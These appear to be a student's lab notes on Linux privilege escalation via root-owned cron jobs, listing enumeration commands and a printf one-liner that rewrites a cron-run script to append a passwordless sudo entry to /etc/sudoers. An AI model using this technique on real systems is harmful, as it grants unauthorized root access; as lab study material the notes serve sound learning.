Cron jobs are timed or scheduled tasks to perform repetitive tasks. In some cases this is a script, command, or application set to run at a specific time.

Cron jobs can be configured by any user on the system. However, we will want to target ones created by the root user as they will be set to run with root privs. These can be used to run applications or binaries that could be used to start a shell, etc.

**commands**

crontab -l ( lists cron jobs owned by that user )
student@attackdefense:/$ grep -rnw /usr -e "/home/student/message" ( greps for any mention of a file path very useful ) 

NOTE: This was pretty neat to do as there was no text editor I had access to on the system:

printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
